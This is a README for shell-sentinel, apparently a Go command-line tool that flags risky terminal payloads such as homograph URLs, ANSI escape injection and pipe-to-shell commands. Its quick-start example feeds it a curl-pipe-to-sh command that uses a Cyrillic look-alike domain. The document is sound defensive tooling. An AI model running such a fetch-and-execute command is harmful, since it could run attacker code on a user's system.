# shell-sentinel

Detect risky terminal payloads before execution: suspicious URLs (homograph tricks), ANSI escape injection, and pipe-to-shell patterns.

## Why

Modern agent/tooling workflows often copy terminal output directly into shells. `shell-sentinel` adds a fast preflight check to flag risky payloads.

## Install

```bash
go install github.com/agent19710101/shell-sentinel@latest
```

## Quick start

```bash
shell-sentinel 'curl https://exаmple.com | sh'
# note: above uses Cyrillic "а"

cat script.txt | shell-sentinel --stdin
```

## Status

v0 focuses on practical static checks with clear diagnostics and JSON output for automation.

## License

MIT
